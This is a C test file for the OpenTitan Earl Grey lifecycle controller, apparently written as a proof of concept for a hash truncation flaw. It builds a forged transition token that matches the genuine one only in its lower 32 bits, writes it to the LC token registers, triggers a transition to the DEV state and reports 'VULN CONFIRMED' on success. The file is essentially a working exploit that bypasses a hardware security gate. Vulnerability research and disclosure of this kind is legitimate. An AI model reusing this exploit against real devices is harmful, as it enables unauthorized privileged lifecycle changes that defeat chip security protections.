#include <stdbool.h>
#include <stdint.h>
#include <string.h>

#include "sw/device/lib/base/mmio.h"
#include "sw/device/lib/base/abs_mmio.h"
#include "sw/device/lib/base/bitfield.h"
#include "sw/device/lib/base/memory.h"
#include "sw/device/lib/runtime/log.h"
#include "sw/device/lib/testing/test_framework/check.h"
#include "sw/device/lib/testing/test_framework/ottf_main.h"

#include "lc_ctrl_regs.h"
#include "hw/top_earlgrey/sw/autogen/top_earlgrey.h"

OTTF_DEFINE_TEST_CONFIG();

#define LC_TOKEN_SIZE 16

// The testbench (DV) can backdoor this symbol to install a known OTP token
// (this mirrors existing LC tests). We initialize it to a deterministic value
// so the test is self-contained in environments where the testbench does not
// override it.
static volatile const uint8_t kExpectedLcToken[LC_TOKEN_SIZE] = {
    0x10, 0x11, 0x12, 0x13,  // word 0
    0x20, 0x21, 0x22, 0x23,  // word 1
    0x30, 0x31, 0x32, 0x33,  // word 2
    0x40, 0x41, 0x42, 0x43,  // word 3 (lowest-address / highest significance depends on HW)
};

// Simple helper: acquire LC mutex using base MMIO operations.
static bool acquire_lc_mutex(mmio_region_t lc) {
  // First check REGWEN for claiming via software.
  uint32_t claim_regwen = mmio_region_read32(
      lc, LC_CTRL_CLAIM_TRANSITION_IF_REGWEN_REG_OFFSET);
  if (claim_regwen == 0) {
    LOG_INFO("LC claim via SW is disabled (REGWEN=0)");
    return false;
  }

  mmio_region_write32(lc, LC_CTRL_CLAIM_TRANSITION_IF_REG_OFFSET,
                      kMultiBitBool8True);
  uint32_t val = mmio_region_read32(lc, LC_CTRL_CLAIM_TRANSITION_IF_REG_OFFSET);
  if (val != kMultiBitBool8True) {
    LOG_INFO("Failed to take LC mutex (read back 0x%08x)", val);
    return false;
  }
  return true;
}

// Release LC mutex.
static void release_lc_mutex(mmio_region_t lc) {
  mmio_region_write32(lc, LC_CTRL_CLAIM_TRANSITION_IF_REG_OFFSET,
                      kMultiBitBool8False);
}

bool test_main(void) {
  LOG_INFO("LC_CTRL HASH TRUNCATION POC START");

  mmio_region_t lc = mmio_region_from_addr(TOP_EARLGREY_LC_CTRL_REGS_BASE_ADDR);

  // 1) Acquire mutex so we can program transition registers.
  CHECK(acquire_lc_mutex(lc), "Failed to acquire lc_ctrl mutex");
  LOG_INFO("Acquired LC mutex");

  // 2) Prepare a forged token that preserves only the lowest 32 bits of the
  // expected token. The vulnerability in RTL compares only the lower 32-bits
  // of the hashed token; therefore keeping the last 4 bytes identical should
  // allow a forged token to pass the check if only 32-bit truncation is used.
  uint8_t forged[LC_TOKEN_SIZE];
  // Set the high 12 bytes to arbitrary values (different from expected).
  for (int i = 0; i < 12; ++i) {
    forged[i] = (uint8_t)(0xAA + i);
  }
  // Copy the lowest 4 bytes from the expected token so the lower 32 bits
  // match the genuine one.
  for (int i = 12; i < 16; ++i) {
    forged[i] = ((const uint8_t *)kExpectedLcToken)[i];
  }

  // 3) Program the token into the LC transition token registers using
  // mmio_region_write32. These registers are 4 words (16 bytes).
  for (int i = 0; i < LC_TOKEN_SIZE; i += 4) {
    uint32_t word = 0;
    // Copy 4 bytes into a uint32_t safely.
    memcpy(&word, &forged[i], sizeof(uint32_t));
    mmio_region_write32(lc, LC_CTRL_TRANSITION_TOKEN_0_REG_OFFSET + i, word);
    LOG_INFO("Wrote token word @ offset 0x%03x = 0x%08x",
             LC_CTRL_TRANSITION_TOKEN_0_REG_OFFSET + i, word);
  }

  // 4) Program transition target. Choose DEV (or RMA) as the target to show a
  // privileged lifecycle change (DEV is used here as an example).
  mmio_region_write32(lc, LC_CTRL_TRANSITION_TARGET_REG_OFFSET,
                      LC_CTRL_TRANSITION_TARGET_STATE_VALUE_DEV);
  // Use internal clock (clear EXT_CLOCK_EN bit).
  uint32_t ctrl_reg = 0;
  ctrl_reg = bitfield_bit32_write(ctrl_reg,
                                  LC_CTRL_TRANSITION_CTRL_EXT_CLOCK_EN_BIT,
                                  false);
  mmio_region_write32(lc, LC_CTRL_TRANSITION_CTRL_REG_OFFSET, ctrl_reg);

  LOG_INFO("Triggering LC transition with forged token (lower 32-bit match)");

  // 5) Trigger the transition command.
  mmio_region_write32(lc, LC_CTRL_TRANSITION_CMD_REG_OFFSET, 1);

  // 6) Optionally release mutex (HW takes over the transition).
  release_lc_mutex(lc);

  // 7) Poll for LC state change. Read LC state register and extract the state
  // field. Give the hardware some cycles to perform the check. In DV this
  // completes quickly; add a timeout to avoid infinite loops.
  const int timeout = 1000000;
  int i = 0;
  bool success = false;
  for (; i < timeout; ++i) {
    uint32_t state_reg = mmio_region_read32(lc, LC_CTRL_LC_STATE_REG_OFFSET);
    uint32_t state_val = bitfield_field32_read(state_reg,
                                               LC_CTRL_LC_STATE_STATE_FIELD);
    if (state_val == LC_CTRL_LC_STATE_STATE_VALUE_DEV) {
      success = true;
      break;
    }
    // Small delay - in a real environment use a platform-specific wait. Here
    // just spin.
  }

  if (success) {
    LOG_INFO("LC transition to DEV succeeded with forged token -> VULN CONFIRMED");
    return true;  // POC succeeded: truncated hash comparison allowed transition.
  } else {
    LOG_INFO("LC transition did not complete within timeout - token likely rejected");
    CHECK(false, "Exploit failed: transition did not succeed");
    return false;
  }
}
